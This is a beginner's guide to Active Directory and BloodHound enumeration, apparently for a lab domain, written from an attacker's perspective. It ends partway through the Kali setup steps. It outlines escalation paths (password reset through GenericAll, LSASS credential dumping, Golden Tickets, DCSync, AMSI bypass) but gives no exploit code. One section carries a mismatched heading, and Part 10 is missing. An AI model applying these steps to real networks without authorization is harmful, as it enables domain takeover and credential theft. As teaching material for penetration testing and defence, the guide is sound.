# DOMAIN ENUMERATION WITH BLOODHOUND
## The Complete Zero-Knowledge Guide

> **"To make an apple pie from scratch, you must first invent the universe."**
> — Carl Sagan
>
> To understand BloodHound, you must first understand:
> - What is a network?
> - What is a directory?
> - What is Active Directory?
> - Why do companies use it?
> - What is LDAP?
> - How do attackers think about AD?
>
> **This guide starts from ABSOLUTE ZERO and builds up.**
> **Every single concept explained with practical examples.**

---

# TABLE OF CONTENTS

**UNDERSTANDING NETWORKS (From Zero)**
1. [What is a Network?](#part-1-network)
2. [Why Do We Need User Accounts?](#part-2-accounts)
3. [What is a Directory?](#part-3-directory)
4. [What is Active Directory?](#part-4-active-directory)
5. [The Domain Controller](#part-5-domain-controller)

**UNDERSTANDING AD OBJECTS**
6. [Users, Groups, and Computers](#part-6-objects)
7. [Organizational Units (OUs)](#part-7-ous)
8. [Group Memberships](#part-8-groups)
9. [Permissions and ACLs](#part-9-permissions)

**HOW AD COMMUNICATES**
10. [What is LDAP?](#part-10-ldap)
11. [What is Kerberos?](#part-11-kerberos)
12. [How Authentication Works](#part-12-authentication)

**THE ATTACKER'S PERSPECTIVE**
13. [Why Attackers Care About AD](#part-13-attacker-view)
14. [What is Enumeration?](#part-14-enumeration)
15. [Attack Paths](#part-15-attack-paths)

**BLOODHOUND**
16. [What is BloodHound?](#part-16-bloodhound)
17. [How BloodHound Works](#part-17-how-bloodhound)
18. [SharpHound - The Data Collector](#part-18-sharphound)

**PRACTICAL EXECUTION**
19. [Lab Setup](#part-19-lab)
20. [Running SharpHound](#part-20-running-sharphound)
21. [Importing Data into BloodHound](#part-21-import)
22. [Finding Attack Paths](#part-22-finding-paths)
23. [Advanced Queries](#part-23-queries)

**INTERVIEW & REFERENCE**
24. [Interview Questions (10+)](#part-24-interview)
25. [Troubleshooting](#part-25-troubleshoot)
26. [Next Steps](#part-26-next)

---

# PART 1: What is a Network? {#part-1-network}

**Before we talk about AD or BloodHound, we need to understand what a network is.**

## Computers Alone Are Isolated

```
IMAGINE A SINGLE COMPUTER:
────────────────────────────────────────────────────────────────

┌─────────────────────────────────────────────────────────────┐
│                                                              │
│   YOUR COMPUTER                                              │
│                                                              │
│   - Your files                                               │
│   - Your programs                                            │
│   - Your user account                                        │
│                                                              │
│   Everything is LOCAL to this one machine.                   │
│                                                              │
└─────────────────────────────────────────────────────────────┘

Problem: What if you want to share a file with a colleague?
         You'd have to copy it to a USB drive and walk it over!
```

## A Network Connects Computers

```
A NETWORK IS SIMPLY CONNECTED COMPUTERS:
────────────────────────────────────────────────────────────────

┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│             │    │             │    │             │
│  COMPUTER 1 │────│  COMPUTER 2 │────│  COMPUTER 3 │
│  (Vamsi)    │    │  (Lakshmi)  │    │  (Pranavi)  │
│             │    │             │    │             │
└─────────────┘    └─────────────┘    └─────────────┘
       │                  │                  │
       └──────────────────┼──────────────────┘
                          │
                    NETWORK CABLE
                    (or WiFi)

NOW:
- Vamsi can share files with Lakshmi without USB drives
- They can use the same printer
- They can send messages to each other
- They can work on the same documents
```

## Real-World Example: Your Home Network

```
YOUR HOME NETWORK:
────────────────────────────────────────────────────────────────

                        INTERNET
                           │
                    ┌──────┴──────┐
                    │             │
                    │   ROUTER    │ ← This creates your network!
                    │             │
                    └──────┬──────┘
                           │
         ┌─────────────────┼─────────────────┐
         │                 │                 │
    ┌────┴────┐      ┌────┴────┐      ┌────┴────┐
    │         │      │         │      │         │
    │ LAPTOP  │      │ PHONE   │      │ SMART   │
    │         │      │         │      │ TV      │
    └─────────┘      └─────────┘      └─────────┘

All these devices can "see" each other:
- Your phone can control your smart TV
- Your laptop can print to your wireless printer
- They're all on the SAME NETWORK!
```

## Business Networks Are Bigger

```
A COMPANY NETWORK (ORSUBANK):
────────────────────────────────────────────────────────────────

                         INTERNET
                            │
                     ┌──────┴──────┐
                     │   FIREWALL  │
                     │  (Security) │
                     └──────┬──────┘
                            │
    ┌───────────────────────┼───────────────────────┐
    │                       │                       │
    │               COMPANY NETWORK                 │
    │                                               │
    │  ┌─────────┐  ┌─────────┐  ┌─────────┐       │
    │  │ LAPTOP  │  │ LAPTOP  │  │ DESKTOP │       │
    │  │ Vamsi   │  │ Lakshmi │  │ Pranavi │       │
    │  └─────────┘  └─────────┘  └─────────┘       │
    │                                               │
    │  ┌─────────┐  ┌─────────┐  ┌─────────┐       │
    │  │ SERVER  │  │ FILE    │  │ EMAIL   │       │
    │  │ (Apps)  │  │ SERVER  │  │ SERVER  │       │
    │  └─────────┘  └─────────┘  └─────────┘       │
    │                                               │
    └───────────────────────────────────────────────┘

A company might have:
- 100 employees with 100 computers
- 10 servers running applications
- Printers, phones, cameras...
- All connected on ONE network
```

---

# PART 2: Why Do We Need User Accounts? {#part-2-accounts}

## The Problem: Who's Allowed to Do What?

```
THE PROBLEM WITH JUST CONNECTING COMPUTERS:
────────────────────────────────────────────────────────────────

If everyone is just connected... who controls what?

BAD SCENARIO:
- Random person walks in
- Sits at a computer
- Can access EVERYTHING?
- Financial data? YES
- Employee records? YES
- Customer information? YES

That's a disaster! We need CONTROL.
```

## User Accounts Control Access

```
USER ACCOUNTS SOLVE THIS:
────────────────────────────────────────────────────────────────

Instead of anyone using any computer...

EACH PERSON gets a USER ACCOUNT:
- Username: vamsi.krishna
- Password: (secret)

EACH RESOURCE has PERMISSIONS:
- Financial Reports folder: Only finance team can access
- Employee Records: Only HR can access
- Company Announcements: Everyone can read

NOW:
- When you log in, the computer knows WHO you are
- Based on who you are, it knows WHAT you can access
- Random person can't just walk in and use everything
```

## The Problem with Individual Computers

```
BUT THERE'S STILL A PROBLEM:
────────────────────────────────────────────────────────────────

SCENARIO: Company has 100 computers

If each computer manages its OWN users:

COMPUTER 1 (Vamsi's):
- User: vamsi / password123

COMPUTER 2 (Lakshmi's):
- User: lakshmi / mypassword

COMPUTER 3 (File Server):
- User: vamsi / password123    ← Had to create again!
- User: lakshmi / mypassword   ← Had to create again!

PROBLEM 1: Vamsi's account must be created on EVERY computer
           100 computers = create account 100 times!

PROBLEM 2: If Vamsi changes password, must change on ALL computers!

PROBLEM 3: New employee? Create account on 100 machines!

PROBLEM 4: Employee leaves? Delete account from 100 machines!

THIS DOESN'T SCALE!
```

---

# PART 3: What is a Directory? {#part-3-directory}

## A Directory is a Phone Book for Your Network

```
THINK OF A PHONE BOOK:
────────────────────────────────────────────────────────────────

TRADITIONAL PHONE BOOK:
┌─────────────────────────────────────────────────────────────┐
│                      PHONE BOOK                              │
│                                                              │
│   NAME                    │  PHONE NUMBER                    │
│   ─────────────────────────────────────────────────────────  │
│   Krishna, Vamsi          │  555-0101                        │
│   Devi, Lakshmi           │  555-0102                        │
│   Orsu, Pranavi           │  555-0103                        │
│   ...                     │  ...                             │
│                                                              │
└─────────────────────────────────────────────────────────────┘

WHAT A PHONE BOOK DOES:
- Stores information about people (name → phone number)
- Organized so you can look things up
- ONE central place for everyone's info
```

## A Network Directory is the Same Concept

```
A NETWORK DIRECTORY:
────────────────────────────────────────────────────────────────

Instead of phone numbers, it stores NETWORK information:

┌─────────────────────────────────────────────────────────────┐
│                    NETWORK DIRECTORY                         │
│                                                              │
│   USERS:                                                     │
│   ├── vamsi.krishna                                          │
│   │   ├── Password: (encrypted)                              │
│   │   ├── Email: vamsi@orsubank.local                        │
│   │   ├── Department: IT                                     │
│   │   └── Groups: BankEmployees, IT_Team                     │
│   │                                                          │
│   ├── lakshmi.devi                                           │
│   │   ├── Password: (encrypted)                              │
│   │   ├── Email: lakshmi@orsubank.local                      │
│   │   ├── Department: Finance                                │
│   │   └── Groups: BankEmployees, Finance_Team                │
│   │                                                          │
│   COMPUTERS:                                                 │
│   ├── WS01                                                   │
│   │   ├── Operating System: Windows 11                       │
│   │   └── IP Address: 192.168.100.101                        │
│   │                                                          │
│   GROUPS:                                                    │
│   ├── Domain Admins (can do anything!)                       │
│   ├── Finance_Team (can access finance files)                │
│   └── ...                                                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘

ONE CENTRAL PLACE stores:
- All user accounts
- All computer information
- All groups
- All permissions
```

## Why This Solves Our Problem

```
NOW WITH A CENTRAL DIRECTORY:
────────────────────────────────────────────────────────────────

BEFORE (No directory):
- Create vamsi on Computer 1
- Create vamsi on Computer 2
- Create vamsi on Computer 3
- ... 100 more times
- Vamsi changes password = change 100 times

AFTER (With directory):
- Create vamsi ONCE in the directory
- ALL 100 computers ask the directory: "Is this user legit?"
- Vamsi changes password = change it ONCE
- All 100 computers automatically use the new password!


ANALOGY:
─────────────────
Before: Everyone keeps their own contact list
        (If Vamsi changes phone number, tell 100 people!)

After:  One central phone book that everyone uses
        (If Vamsi changes phone number, update it once!)
```

---

# PART 4: What is Active Directory? {#part-4-active-directory}

## Active Directory is Microsoft's Directory Service

```
ACTIVE DIRECTORY (AD) = MICROSOFT'S NETWORK DIRECTORY
────────────────────────────────────────────────────────────────

Microsoft created Active Directory to be THE directory for Windows networks.

It stores:
✓ All user accounts
✓ All computer accounts
✓ All groups
✓ Permissions (who can access what)
✓ Policies (password rules, security settings)
✓ Much more!

Almost EVERY company that uses Windows uses Active Directory!
- Small company: 50 users
- Large company: 500,000+ users
- Government, banks, hospitals, everywhere!
```

## Active Directory Structure

```
AD IS ORGANIZED LIKE A TREE:
────────────────────────────────────────────────────────────────

            ┌───────────────────────────────────────┐
            │                                       │
            │   FOREST (orsubank.local)             │
            │   The whole organization              │
            │                                       │
            └───────────────────┬───────────────────┘
                                │
            ┌───────────────────┴───────────────────┐
            │                                       │
            │   DOMAIN (orsubank.local)             │
            │   A logical grouping                  │
            │                                       │
            └───────────────────┬───────────────────┘
                                │
        ┌───────────────────────┼───────────────────────┐
        │                       │                       │
┌───────┴───────┐       ┌───────┴───────┐       ┌───────┴───────┐
│               │       │               │       │               │
│  OU: Users    │       │ OU: Computers │       │ OU: Groups    │
│               │       │               │       │               │
│ - vamsi       │       │ - WS01        │       │ - Domain      │
│ - lakshmi     │       │ - WS02        │       │   Admins      │
│ - pranavi     │       │ - DC01        │       │ - IT Team     │
│               │       │               │       │ - Finance     │
└───────────────┘       └───────────────┘       └───────────────┘


KEY TERMS:
- FOREST: The whole AD environment (can have multiple domains)
- DOMAIN: A logical grouping (orsubank.local)
- OU: Organizational Unit - folders to organize objects
- OBJECTS: Users, Computers, Groups - the actual things stored
```

## Why is AD Called "Active" Directory?

```
"ACTIVE" MEANS IT DOES THINGS:
────────────────────────────────────────────────────────────────

A regular phone book is PASSIVE:
- It just sits there
- You look things up
- It doesn't do anything on its own

Active Directory is ACTIVE:
- It authenticates users (checks passwords)
- It enforces policies (password must be 12 characters!)
- It replicates changes (updates spread automatically)
- It responds to queries (programs can ask it questions)

AD is not just storage - it's a living, working system!
```

---

# PART 5: The Domain Controller {#part-5-domain-controller}

## The Domain Controller (DC) Runs Active Directory

```
DOMAIN CONTROLLER = THE SERVER RUNNING AD
────────────────────────────────────────────────────────────────

Active Directory is just SOFTWARE (a database + services).
It runs on a WINDOWS SERVER called a Domain Controller (DC).

┌─────────────────────────────────────────────────────────────┐
│                                                              │
│   DOMAIN CONTROLLER (DC01)                                   │
│   ────────────────────────                                   │
│                                                              │
│   It's a Windows Server that runs:                           │
│   - Active Directory Domain Services (AD DS)                 │
│   - The AD database (ntds.dit)                               │
│   - LDAP service (for queries)                               │
│   - Kerberos service (for authentication)                    │
│   - DNS service (for name resolution)                        │
│                                                              │
│   ALL USER LOGINS GO THROUGH THIS SERVER!                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

## How Login Works with a DC

```
WHAT HAPPENS WHEN YOU LOG IN:
────────────────────────────────────────────────────────────────

1. You sit at WS01 (workstation)
2. You type: Username: vamsi.krishna
              Password: MyP@ssw0rd!

3. WS01 doesn't know if this is correct!
   WS01 asks DC01: "Hey, is vamsi.krishna / MyP@ssw0rd! valid?"

4. DC01 checks its database:
   - Does vamsi.krishna exist? YES
   - Is the password correct? YES
   - Is the account enabled? YES
   - DC01 → WS01: "Yes, this user is legit!"

5. WS01 lets you log in.

6. Now WS01 knows you are vamsi.krishna
   and can check what you're allowed to access.


VISUALIZATION:
─────────────────

[YOU] ──login──► [WS01] ──"is this valid?"──► [DC01]
                    │                             │
                    │                             │
                    │ ◄──"yes, valid!"────────────┘
                    │
                    └──► Welcome, vamsi.krishna!
```

## The DC is the Kingdom's Castle

```
ANALOGY: THE KINGDOM
────────────────────────────────────────────────────────────────

DOMAIN = THE KINGDOM (orsubank.local)
- All the land, people, and resources

DOMAIN CONTROLLER = THE CASTLE
- Where the king lives
- Where all records are kept
- Where decisions are made

USERS = THE CITIZENS
- They live in the kingdom
- They need permission to access things

DOMAIN ADMIN = THE KING
- Can do ANYTHING in the kingdom
- Has absolute power


AS AN ATTACKER:
─────────────────
If you capture the CASTLE (Domain Controller)...
You own the ENTIRE KINGDOM (whole network)!

This is why AD attacks aim for Domain Admin!
Control DC = Control Everything!
```

---

# PART 6: Users, Groups, and Computers {#part-6-objects}

## AD Objects - The Things Stored in AD

```
EVERYTHING IN AD IS AN "OBJECT":
────────────────────────────────────────────────────────────────

OBJECT TYPE         │  WHAT IT REPRESENTS
────────────────────────────────────────────────────────────────
User                │  A person who logs in (vamsi.krishna)
Computer            │  A machine joined to the domain (WS01)
Group               │  A collection of users/computers
Organizational Unit │  A folder to organize objects
Group Policy        │  Settings that apply to users/computers
```

## User Objects

```
A USER OBJECT STORES EVERYTHING ABOUT A PERSON:
────────────────────────────────────────────────────────────────

USER: vamsi.krishna
├── sAMAccountName: vamsi.krishna     ← Login name
├── userPrincipalName: vamsi.krishna@orsubank.local
├── displayName: Vamsi Krishna Orsu
├── mail: vamsi@orsubank.local
├── department: Information Technology
├── title: Security Engineer
├── manager: CN=lakshmi.devi,OU=Users,DC=orsubank,DC=local
├── memberOf:                          ← Groups this user is in
│   ├── CN=Domain Users,CN=Users,DC=orsubank,DC=local
│   ├── CN=IT_Team,OU=Groups,DC=orsubank,DC=local
│   └── CN=BankEmployees,OU=Groups,DC=orsubank,DC=local
├── lastLogon: 2024-12-27 10:30:00
├── pwdLastSet: 2024-12-01 09:00:00
├── userAccountControl: 512            ← Account flags (enabled, etc.)
└── ... many more attributes!
```

## Computer Objects

```
A COMPUTER OBJECT REPRESENTS A MACHINE:
────────────────────────────────────────────────────────────────

COMPUTER: WS01$                        ← Note the $ at the end!
├── dNSHostName: WS01.orsubank.local
├── operatingSystem: Windows 11 Pro
├── operatingSystemVersion: 10.0 (22631)
├── lastLogonTimestamp: 2024-12-27 08:00:00
├── servicePrincipalName:              ← What services it offers
│   ├── HOST/WS01.orsubank.local
│   ├── HOST/WS01
│   └── RestrictedKrbHost/WS01.orsubank.local
└── ... more attributes


WHY COMPUTERS HAVE ACCOUNTS:
────────────────────────────
Just like users, computers need to prove who they are!
When WS01 talks to DC01, it authenticates using its computer account.
This prevents random computers from joining the network.
```

## Group Objects

```
A GROUP IS A COLLECTION:
────────────────────────────────────────────────────────────────

Instead of giving permissions to individual users...
Give permissions to a GROUP, then add users to the group!


GROUP: Finance_Team
├── member:
│   ├── CN=lakshmi.devi,OU=Users,DC=orsubank,DC=local
│   ├── CN=pranavi,OU=Users,DC=orsubank,DC=local
│   └── CN=harsha.vardhan,OU=Users,DC=orsubank,DC=local
└── description: Members of the Finance department


WHY GROUPS MATTER:
──────────────────
SCENARIO: Finance folder should only be accessed by finance team

WITHOUT GROUPS:
- Give permission to lakshmi.devi
- Give permission to pranavi
- Give permission to harsha.vardhan
- New person joins? Give them permission too!
- Someone leaves? Remove their permission!

WITH GROUPS:
- Give permission to Finance_Team group (ONCE)
- Add/remove people from the group as needed
- Permissions automatically apply!
```

---

# PART 7: Organizational Units (OUs) {#part-7-ous}

## OUs Are Folders for Organization

```
ORGANIZATIONAL UNITS = FOLDERS IN AD
────────────────────────────────────────────────────────────────

Just like folders on your computer organize files...
OUs organize AD objects!

DOMAIN: orsubank.local
│
├── OU=BankEmployees
│   ├── CN=vamsi.krishna
│   ├── CN=lakshmi.devi
│   └── CN=pranavi
│
├── OU=IT_Department
│   ├── CN=ammulu.orsu        ← IT Manager
│   └── CN=kiran.kumar        ← IT Admin
│
├── OU=Workstations
│   ├── CN=WS01$
│   └── CN=WS02$
│
├── OU=Servers
│   └── CN=FileServer01$
│
└── OU=Service Accounts
    ├── CN=svc_backup
    └── CN=svc_sql
```

## OUs Also Apply Policies

```
OUs LET YOU APPLY SETTINGS TO GROUPS OF OBJECTS:
────────────────────────────────────────────────────────────────

EXAMPLE: Different password policies for different groups

OU=BankEmployees
└── Policy: Password must be 12 characters

OU=Service Accounts  
└── Policy: Password must be 25 characters

OU=Executives
└── Policy: Password must be 16 characters + MFA required


This is done through GROUP POLICY OBJECTS (GPOs).
GPOs link to OUs and apply settings to everything inside.
```

---

# PART 8: Group Memberships {#part-8-groups}

## Groups Can Contain Groups (Nesting!)

```
GROUPS CAN BE NESTED:
────────────────────────────────────────────────────────────────

GROUP: Domain Admins
├── ammulu.orsu         ← Direct member (this is a Domain Admin!)
└── GROUP: Server_Admins    ← Nested group!
    └── kiran.kumar     ← kiran is in Server_Admins
                            which is in Domain Admins
                            so kiran IS a Domain Admin!


THIS IS CRITICAL FOR ATTACKERS:
───────────────────────────────

You might look at Domain Admins and see only 1 user (ammulu.orsu).
But if you trace the nested groups, you might find:

Domain Admins
└── Server_Admins
    └── IT_Support
        └── HelpDesk_Team
            └── vamsi.krishna    ← Wait... vamsi is actually a Domain Admin
                                    through 4 levels of nesting!

BloodHound finds these hidden paths automatically!
```

## Important Built-in Groups

```
WINDOWS HAS BUILT-IN GROUPS WITH SPECIAL POWERS:
────────────────────────────────────────────────────────────────

GROUP                   │  POWER LEVEL  │  WHAT THEY CAN DO
────────────────────────────────────────────────────────────────
Domain Admins          │  ⭐⭐⭐⭐⭐     │  EVERYTHING in the domain!
Enterprise Admins      │  ⭐⭐⭐⭐⭐     │  Everything in the FOREST!
Administrators         │  ⭐⭐⭐⭐       │  Local admin on DCs
Account Operators      │  ⭐⭐⭐         │  Can create/modify users
Server Operators       │  ⭐⭐⭐         │  Can log into DCs, manage services
Backup Operators       │  ⭐⭐           │  Can backup files (bypass permissions!)
Print Operators        │  ⭐⭐           │  Can manage printers
Domain Users           │  ⭐             │  Basic authenticated users


ATTACKER'S GOAL:
─────────────────
Start as: Domain Users (vamsi.krishna - regular employee)
End as:   Domain Admins (complete control!)

We use enumeration to find a PATH from one to the other!
```

---

# PART 9: Permissions and ACLs {#part-9-permissions}

## Every Object Has Permissions (Who Can Do What)

```
ACL = ACCESS CONTROL LIST = LIST OF PERMISSIONS
────────────────────────────────────────────────────────────────

Every AD object has an ACL that says:
- WHO can access it
- WHAT they can do to it

EXAMPLE: User object "lakshmi.devi"

ACL for lakshmi.devi:
────────────────────────────────────────────────────────────────
WHO                    │  WHAT THEY CAN DO
────────────────────────────────────────────────────────────────
SELF                   │  Change own password
Domain Admins          │  Full Control (anything!)
Account Operators      │  Reset password, modify attributes
vamsi.krishna          │  GenericAll ← WAIT... why does vamsi
                       │               have full control over
                       │               lakshmi's account?!

THIS IS A MISCONFIGURATION!
If vamsi.krishna is compromised, attacker can:
- Reset lakshmi's password
- Take over lakshmi's account
- If lakshmi is a Domain Admin... GAME OVER!
```

## Dangerous Permissions

```
LDAP IS HOW WE GATHER INFORMATION:
────────────────────────────────────────────────────────────────

With valid domain credentials (even just a regular user!), we can:

1. List ALL users in the domain
2. List ALL groups and their members
3. List ALL computers
4. See permissions on objects
5. Find misconfigurations!

THIS IS CALLED ENUMERATION!

Tools that use LDAP:
- BloodHound (via SharpHound)
- PowerView
- ldapsearch
- ADExplorer

Any domain user can read most of AD by default!
```

---

# PART 11: What is Kerberos? {#part-11-kerberos}

## Kerberos = The Authentication Protocol

Kerberos is the authentication system used in Active Directory. When you log in to your Windows workstation, Kerberos handles the authentication.

**Why is it called Kerberos?**

Kerberos is named after the three-headed dog from Greek mythology that guards the underworld. The protocol has three main components:
1. The Client (you)
2. The Server (what you want to access)
3. The KDC (Key Distribution Center - the DC)

**How Kerberos Authentication Works (Simplified):**

```
YOU WANT TO ACCESS A FILE SERVER:
────────────────────────────────────────────────────────────────

Step 1: YOU -> DC (KDC)
        "I'm vamsi.krishna, here's proof I know my password"
        
        DC checks password, gives you a TGT (Ticket Granting Ticket)
        Think of TGT as a "day pass" that proves who you are

Step 2: YOU -> DC (KDC)  
        "I have this TGT, I want to access FileServer01"
        
        DC gives you a Service Ticket for FileServer01

Step 3: YOU -> FILE SERVER
        "Here's my Service Ticket for you"
        
        FileServer01 accepts the ticket, lets you in!


KEY CONCEPT:
─────────────
After initial login, you NEVER send your password again!
You only send tickets. This is more secure.
```

**Why Attackers Care About Kerberos:**

| Kerberos Weakness | Attack Name | What it does |
|-------------------|-------------|--------------|
| Service accounts have weak passwords | Kerberoasting | Crack service account passwords offline |
| Pre-authentication can be disabled | AS-REP Roasting | Get password hashes without authentication |
| TGT can be forged if krbtgt hash is known | Golden Ticket | Unlimited access forever |
| Service tickets can be forged | Silver Ticket | Access specific services |

We will cover these attacks in later walkthroughs!

---

# PART 12: How Authentication Works {#part-12-authentication}

## The Complete Login Flow

When you sit at a Windows workstation and log in, here's what happens:

```
COMPLETE LOGIN FLOW:
────────────────────────────────────────────────────────────────

1. You type username and password at WS01
   
2. WS01 sends authentication request to DC01 (Kerberos AS-REQ)
   
3. DC01 checks:
   - Does this user exist? 
   - Is the password correct?
   - Is the account enabled?
   - Is the account locked?
   
4. DC01 returns a TGT (Ticket Granting Ticket)
   - This TGT is encrypted with krbtgt hash
   - Only the DC can create/validate TGTs
   
5. WS01 caches the TGT in memory (LSASS process)
   - The TGT is valid for 10 hours by default
   
6. When you access resources, WS01 uses TGT to get Service Tickets
   
7. Service Tickets are presented to access resources

IMPORTANT FOR ATTACKERS:
────────────────────────
- TGTs are cached in LSASS memory
- If we dump LSASS, we get tickets!
- Pass-the-Ticket attacks use stolen tickets
- Golden Ticket forges a TGT (game over!)
```

---

# PART 13: Why Attackers Care About AD {#part-13-attacker-view}

## AD is the Keys to the Kingdom

**From an attacker's perspective, Active Directory is the most valuable target because:**

```
WHY AD IS THE ULTIMATE TARGET:
────────────────────────────────────────────────────────────────

1. CENTRALIZED CONTROL
   - One system controls ALL user access
   - Compromise AD = Compromise everything
   
2. EVERYONE USES IT
   - 95%+ of enterprises use AD
   - Banks, hospitals, governments, everything!
   
3. RICH ATTACK SURFACE
   - Kerberos weaknesses (Kerberoasting, AS-REP)
   - Trust relationships
   - ACL misconfigurations
   - Credential storage
   
4. CREDENTIAL REUSE
   - Users often have same password everywhere
   - Service accounts rarely change passwords
   - Admin accounts get used on multiple machines
   
5. PERSISTENCE
   - Once you're Domain Admin, you can create backdoors
   - Golden Tickets last 10 years by default!
   - Very hard to fully remove an attacker
```

## The Attack Chain

```
TYPICAL AD ATTACK PROGRESSION:
────────────────────────────────────────────────────────────────

[Initial Access] -> [Enumeration] -> [Privilege Escalation] -> [Domain Admin]

1. INITIAL ACCESS
   Get foothold on ONE machine with domain credentials
   (Phishing, exploit, stolen creds, etc.)
   
2. ENUMERATION  <-- THIS IS WHERE WE ARE NOW!
   Map out the domain - who has what permissions?
   Find attack paths to Domain Admin
   
3. PRIVILEGE ESCALATION  
   Follow the path - exploit misconfigs
   Kerberoast, ACL abuse, credential theft
   
4. LATERAL MOVEMENT
   Move from machine to machine
   Following the path to your target
   
5. DOMAIN ADMIN
   Complete control of the domain
   DCSync to dump all credentials
   Create persistence (Golden Ticket)
```

---

# PART 14: What is Enumeration? {#part-14-enumeration}

## Enumeration = Mapping the Network

**Enumeration is the process of gathering information about a target.**

In AD enumeration, we want to discover:
- All users and their properties
- All groups and their memberships
- All computers
- Trust relationships
- ACL configurations (who can do what to whom)
- Logged-on users (who is where)
- Sessions and local admins

**Why Enumeration is Critical:**

```
ANALOGY: ROBBING A BANK
────────────────────────────────────────────────────────────────

WITHOUT ENUMERATION:
- Walk into random bank
- Don't know where vault is
- Don't know guard schedules
- Don't know alarm systems
- Get caught immediately

WITH ENUMERATION:
- Study the bank for weeks
- Know every entrance and exit
- Know when guards change shifts
- Know how alarms work
- Precise, surgical strike

AD ENUMERATION TELLS US:
- Where are the high-value targets? (Domain Admins)
- What paths lead to those targets?
- What's the easiest path?
- What credentials do we need?
```

## What We Enumerate

| What | Why we care | How we get it |
|------|-------------|---------------|
| Users | Find high-privilege accounts | LDAP queries |
| Groups | Find who has what access | LDAP queries |
| Computers | Find targets for lateral movement | LDAP queries |
| Sessions | Find where admins are logged in | NetSessionEnum |
| Local Admins | Find paths for lateral movement | Remote registry/WMI |
| ACLs | Find privilege escalation paths | LDAP queries |
| Trusts | Find paths to other domains | LDAP queries |

---

# PART 15: Attack Paths {#part-15-attack-paths}

## What is an Attack Path?

**An attack path is a chain of misconfigurations that leads to a target.**

```
EXAMPLE ATTACK PATH:
────────────────────────────────────────────────────────────────

YOU START AS: vamsi.krishna (regular Domain User)

PATH DISCOVERED:
────────────────

vamsi.krishna
    |
    | [GenericAll on lakshmi.devi]
    v
lakshmi.devi
    |
    | [Member of IT_Support]
    v
IT_Support (group)
    |
    | [AdminTo WS02]
    v
WS02 (computer)
    |
    | [pranavi is logged in here]
    v
pranavi (has session on WS02)
    |
    | [Member of Domain Admins]
    v
Domain Admins!!!

THE ATTACK:
───────────
1. vamsi resets lakshmi's password (GenericAll permission)
2. Log in as lakshmi
3. As lakshmi (IT_Support), access WS02 as local admin
4. On WS02, dump credentials from memory
5. Find pranavi's credentials (she's logged in)
6. Log in as pranavi
7. pranavi is Domain Admin = WIN!
```

**BloodHound automatically finds these paths!**

---

# PART 16: What is BloodHound? {#part-16-bloodhound}

## BloodHound = Attack Path Visualization Tool

**BloodHound is a tool that:**
1. Collects data about Active Directory (using SharpHound)
2. Analyzes relationships between objects
3. Finds attack paths to high-value targets
4. Visualizes paths as graphs

**BloodHound Components:**

| Component | What it is | Where it runs |
|-----------|-----------|---------------|
| **SharpHound** | Data collector (.exe or .ps1) | On compromised Windows machine |
| **BloodHound GUI** | Analysis and visualization tool | On your attack machine (Kali) |
| **Neo4j** | Graph database | Stores the collected data |

**Who Made BloodHound?**

BloodHound was created by:
- Andy Robbins (@_wald0)
- Rohan Vazarkar (@CptJesus)
- Will Schroeder (@harmj0y)

It was released at DEF CON 24 (2016) and has become THE standard tool for AD enumeration.

---

# PART 17: How BloodHound Works {#part-17-how-bloodhound}

## The Collection and Analysis Process

```
BLOODHOUND WORKFLOW:
────────────────────────────────────────────────────────────────

STEP 1: RUN SHARPHOUND ON COMPROMISED MACHINE
        |
        | SharpHound queries Active Directory via LDAP
        | Collects users, groups, computers, ACLs, sessions
        |
        v
STEP 2: GET THE OUTPUT FILE
        |
        | SharpHound creates a .zip file with JSON data
        | Transfer this file to your attack machine
        |
        v
STEP 3: IMPORT INTO BLOODHOUND
        |
        | Start Neo4j database
        | Start BloodHound GUI
        | Upload the .zip file
        |
        v
STEP 4: ANALYZE AND FIND PATHS
        |
        | Mark your owned accounts
        | Run queries to find paths
        | Visualize attack paths
        |
        v
STEP 5: EXECUTE THE ATTACK
        Follow the path BloodHound found!
```

## What Data Does SharpHound Collect?

| Collection Method | What it collects | How |
|-------------------|------------------|-----|
| **Default** | Users, Groups, Computers, Trusts, ACLs | LDAP |
| **Session** | Who is logged in where | NetSessionEnum, Registry |
| **LocalAdmin** | Who has local admin on computers | Remote Registry, WMI |
| **All** | Everything above | All methods |

---

# PART 18: SharpHound - The Data Collector {#part-18-sharphound}

## SharpHound Versions

**SharpHound.exe** - Compiled executable (.exe)
- Easier to run
- Can be detected by AV
- Used with Sliver's execute-assembly

**SharpHound.ps1** - PowerShell script
- More flexible
- Easily caught by AMSI
- Needs AMSI bypass first

## SharpHound Collection Methods

```
SHARPHOUND COLLECTION OPTIONS:
────────────────────────────────────────────────────────────────

--CollectionMethods (or -c):

DEFAULT          Basic collection (fast, safe)
                 Users, Groups, Computers, Trusts, ACLs

GROUP            Just group membership info

SESSION          Current logged-on users (can be noisy!)

LOCALADMIN       Who is local admin (requires admin rights on targets)

TRUSTS           Domain trust relationships

ACL              Access Control Lists (permissions)

CONTAINER        OUs and GPO links

ALL              Everything (slowest, most data, most noisy!)


FOR OUR LAB, USE: --CollectionMethods All
```

## SharpHound Output

When SharpHound finishes, it creates a .zip file containing:
- `*_users.json` - All user objects
- `*_computers.json` - All computer objects
- `*_groups.json` - All groups and memberships
- `*_domains.json` - Domain info and trusts
- `*_gpos.json` - Group policies (if collected)
- `*_ous.json` - Organizational units

---

# PART 19: Lab Setup {#part-19-lab}

## Prerequisites

Before running BloodHound enumeration, you need:

```
REQUIREMENTS:
────────────────────────────────────────────────────────────────

1. INITIAL ACCESS
   - Beacon on a domain-joined Windows machine (WS01)
   - You got this from the previous walkthrough!
   
2. DOMAIN CREDENTIALS
   - Any valid domain user account
   - Even the lowest-privilege user can enumerate!
   
3. TOOLS ON KALI
   - Neo4j (graph database)
   - BloodHound GUI
   - SharpHound.exe (to transfer to target)
   
4. NETWORK ACCESS
   - The compromised machine must be able to reach DC01
   - LDAP (port 389) and other ports must be open
```

## Installing BloodHound on Kali

```bash
# Update package lists
sudo apt update

# Install Neo4j (graph database that BloodHound uses)
sudo apt install neo4j -y

# Install BloodHound
sudo apt install bloodhound -y

# Start Neo4j service
sudo neo4j start

# Wait 30 seconds for Neo4j to start
sleep 30

# Access Neo4j web interface to set password
# Open browser to: http://localhost:7474
# Default credentials: neo4j / neo4j
# You'll be prompted to set a new password (use: bloodhound)
```

**First-time Neo4j Setup:**

1. Open browser: `http://localhost:7474`
2. Login: `neo4j` / `neo4j`
3. Set new password: `bloodhound`

**Start BloodHound:**

```bash
